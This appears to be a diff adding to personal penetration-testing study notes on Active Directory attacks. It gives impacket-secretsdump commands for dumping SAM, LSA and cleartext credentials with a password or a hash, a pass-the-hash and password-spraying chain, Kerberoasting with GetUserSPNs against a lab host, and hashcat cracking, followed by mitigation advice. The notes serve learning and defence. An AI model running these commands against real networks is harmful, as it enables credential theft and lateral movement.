@@ -156,5 +156,41 @@ crackmapexec smb -L
 
 
 DUMPING and CRACKING HASHES
-this can be achieved with the use of secretsdu
+this can be achieved with the use of secretsdump
+cmd: impacket-secretsdump <domain>\<user>:'Password'@<ip-address>
+   <img width="1211" height="632" alt="image" src="https://github.com/user-attachments/assets/9328fd5b-74ac-47b9-b3db-a9ff50eb7791" />
+
+   this tool can dump alot of information. sam hashes, lsa, DCC2, LSA Secrets, ability to see password in cleartext,wdigest.( 
+
+you also use hashes with secretsdumps command
+cmd: impacket-secretdump administrator:@<ip_address> -hashes shjdfjhjsdfjksf
+
+   <img width="1153" height="634" alt="image" src="https://github.com/user-attachments/assets/b98a3497-4503-454d-a095-a7688b4347f6" />
+
+so imagine we have llmnr -> get user hash -> cracked hashes -> spray the password -> found new login -> secretdump the logins - > local admin hashes - > respray the network with local accounts
+
+you can also crack hashes. You need NT portion of the hash when you wanna crack the hash. 
+
+Pass the hash / Pass the password Mitigation
+ Limit account re-use:
+• Avoid re-using local admin password
+• Disable Guest and Administrator accounts
+• Limit who is a local administrator (least privilege)
+• Utilize strong passwords:
+• The longer the better (>14 characters)
+• Avoid using common words
+• I like long sentences
+• Privilege Access Management (PAM):
+• Check out/in sensitive accounts when needed
+• Automatically rotate passwords on check out and check
+• Limits pass attacks as hash/password is strong and constantly rotated
+
+b. Kerberoasting attacks
+This attack takes advantage of service accounts
+   impacket-GetUserSPNs FKEYS.local/bjames:Password! -dc-ip 192.168.182.139 -request
+   <img width="895" height="374" alt="image" src="https://github.com/user-attachments/assets/ccb90c8e-47b1-4f5e-8e06-12909809244c" />
+
+   <img width="962" height="668" alt="image" src="https://github.com/user-attachments/assets/2245384c-ca81-4237-a8b7-64bc1082709a" />
+
+hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
 
